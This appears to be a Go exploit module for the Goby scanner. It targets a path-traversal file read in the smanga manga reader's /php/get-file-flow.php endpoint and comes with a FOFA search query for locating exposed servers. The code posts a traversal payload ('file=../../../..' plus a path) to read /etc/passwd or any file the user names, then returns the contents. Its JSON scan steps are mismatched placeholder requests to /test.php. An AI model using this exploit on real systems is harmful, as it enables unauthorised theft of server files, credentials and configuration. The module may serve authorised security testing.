package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "smanga /php/get-file-flow.php File Read Vulnerability",
    "Description": "<p>Smanga is a manga streaming reading app. Inspired by Emby Plex, a comic reader developed to solve the needs of comic reading. Among them get-file-flow.php page has an arbitrary file read vulnerability, and an attacker can exploit the vulnerability to obtain the specified file content of the server.</p>",
    "Product": "smanga",
    "Homepage": "https://s-manga.net/",
    "DisclosureDate": "2024-10-24",
    "PostTime": "2024-10-24",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title=\"smanga\" && body=\"smanga\"",
    "GobyQuery": "title=\"smanga\" && body=\"smanga\"",
    "Level": "1",
    "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.</p>",
    "Recommendation": "<p>1. Let web users only access (read) the files and paths they need </p><p> 2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities  </p><p> 3. Make it impossible for users to access paths other than the root directory of the web.</p>",
    "References": [
        "https://www.ddpoc.com/DVB-2023-5098.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize,passwd",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "4.5",
    "Translation": {
        "CN": {
            "Name": "smanga /php/get-file-flow.php 文件读取漏洞",
            "Product": "smanga",
            "Description": "<p>smanga是一个漫画流媒体阅读应用。以emby plex为灵感，为解决漫画阅读需求而开发的漫画阅读器。其中get-file-flow.php页面存在任意文件读取漏洞，攻击者可以利用漏洞获取服务器指定文件内容。<br></p>",
            "Recommendation": "<p>1、让web 用户只能访问（读取），所需要的文件和路径&nbsp;</p><p>2、不能有文件包含漏洞，目录遍历漏洞或其他漏洞&nbsp;</p><p>3、让用户不能访问Web 根目录以外的路径。<br></p>",
            "Impact": "<p>下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "smanga /php/get-file-flow.php File Read Vulnerability",
            "Product": "smanga",
            "Description": "<p>Smanga is a manga streaming reading app. Inspired by Emby Plex, a comic reader developed to solve the needs of comic reading. Among them get-file-flow.php page has an arbitrary file read vulnerability, and an attacker can exploit the vulnerability to obtain the specified file content of the server.<br></p>",
            "Recommendation": "<p>1. Let web users only access (read) the files and paths they need&nbsp;</p><p>&nbsp;2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities&nbsp;&nbsp;</p><p>&nbsp;3. Make it impossible for users to access paths other than the root directory of the web.<br></p>",
            "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`

	postOrGet_m9jXTEDGmn := func(hostInfo *httpclient.FixUrl, fileUrl string, pocContent string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 20
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = "file=../../../../../../../.." + pocContent
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Content-Type": "application/x-www-form-urlencoded",
			"Cookie": "thinkphp_show_page_trace=0|0",
		}

		resp, err := setPostRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/php/get-file-flow.php"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root",
			}
			// 函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, vulURL, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL + fileUrl
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root"},
			}

			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, "/php/get-file-flow.php", fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = "敏感信息泄露\n" + resp
			return expResult
		},
	))
}
